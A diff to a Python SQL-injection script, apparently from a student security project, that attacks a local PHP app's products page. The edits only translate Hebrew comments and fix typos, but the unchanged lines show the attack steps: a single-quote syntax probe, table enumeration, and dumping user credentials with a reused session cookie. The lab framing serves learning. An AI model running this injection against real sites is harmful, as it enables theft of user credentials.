@@ -7,8 +7,9 @@ import re
 BASE_URL = "http://localhost/CyberProject" 
 sid = "rv82jh01b0c0pq4ift362fg6vp" # CHEAT - replace with a valid session ID obtained from a successful login or the SQLi bypass
 
-#CHEAT - how do we now that we need to use prudacts page?
-#אבל תכלס אפשר לגלות את זה מחיפוש באתר בתור משתמש, ממחקר מקדים שמבצע התוקף
+#CHEAT - how do we know we need to use the products page?
+# In reality, an attacker would discover this through normal site reconnaissance
+# (browsing the app as a user, looking for inputs that hit the database).
 
 def dump_users(target_url="http://localhost/CyberProject/products.php", session_id=sid):
 
@@ -28,7 +29,7 @@ def dump_users(target_url="http://localhost/CyberProject/products.php", session_
 
 
     #----------------------------------------------------------------------------------------------
-    # --- Step 1: cheack if SQLi exitse ---
+    # --- Step 1: check if SQLi exists ---
     print_step("Sanity Check", "%'", "Sending a single quote to break the query syntax.")
     cookies = {'PHPSESSID': session_id} if session_id else {}
     found_creds = []
@@ -103,7 +104,7 @@ def dump_users(target_url="http://localhost/CyberProject/products.php", session_
     print(f"\033[1;36m[+] Tables found in DB: {', '.join(tables)}\033[0m")
 
     #----------------------------------------------------------------------------------------------
-    # --- Step 5: Dump Users and Passwords (גרסת ה-Article עם תיקון ה-ID) ---
+    # --- Step 5: Dump Users and Passwords (article-card version, with ID fix) ---
     if 'users' in tables:
         target_cols = ["NULL"] * detected_cols
         target_cols[0] = "id" 
